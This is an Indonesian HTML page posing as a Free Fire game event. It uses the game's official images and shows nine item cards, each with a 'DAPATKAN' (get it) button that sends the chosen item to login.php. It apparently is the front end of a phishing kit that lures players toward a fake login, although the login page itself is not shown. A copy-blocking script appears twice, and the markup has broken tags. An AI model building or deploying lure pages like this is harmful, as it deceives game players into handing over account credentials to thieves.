<!DOCTYPE html>
<html>
<script type='text/javascript'>
//<![CDATA[
document.addEventListener('copy', function (e){
    e.preventDefault();
  e.clipboardData.setData("text/plain", "Jangan Copas Gan :) "+window.location.href+"");
})
//]]>
</script>
<head>
    <meta charset="UTF-8">
    <title>EVENT FREE FIRE - BURUAN BELI !!!</title>
    <link rel="stylesheet" href="ccss/style.css">
    <link rel="shortcut icon" href="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png"/>
</head>
<script type='text/javascript'>
//<![CDATA[
document.addEventListener('copy', function (e){
    e.preventDefault();
  e.clipboardData.setData("text/plain", "Jangan Copas Gan :) "+window.location.href+"");
})
//]]>
</script>
<body>
    
       <center><img style="width: 100%; height:100%;" src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/pop/038.jpg" /></center><br>
                <span class="name"></span>
</div>
            </form>
    </div>
    
    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="js/vendor/uhu/uhuinfo1.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color:white;background-color: rgb(40,45,86);" value="DAPATKAN" class="tombol"/>
            </form>
       
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="js/vendor/uhu/uhuinfo2.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="DAPATKAN" class="tombol"/>
            </form>
      
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="js/vendor/uhu/uhuinfo3.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="DAPATKAN" class="tombol"/>
            </form>
       
        </div>
    </div>

    
    <div id="pricing">
            </div>
            </from>
    </div>

    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="js/vendor/uhu/uhuinfo4.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="DAPATKAN" class="tombol"/>
            </form>
       
        </div>
        <div class="price_card alpha">              
            <div class="header">
                <img src="js/vendor/uhu/uhuinfo10.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="DAPATKAN" class="tombol"/>
            </form>
     
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="js/vendor/uhu/uhuinfo6.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="DAPATKAN" class="tombol"/>
            </form>
       
        </div>
    </div>

    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="js/vendor/uhu/uhuinfo7.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="DAPATKAN" class="tombol"/>
            </form>
      
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="js/vendor/uhu/uhuinfo8.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="DAPATKAN" class="tombol"/>
            </form>
          
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="js/vendor/uhu/uhuinfo5.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: white;background-color: rgb(40,45,86);" value="DAPATKAN" class="tombol"/>
            </form>
      
 
      
            </form>
        </div>
    </div>
    
</html>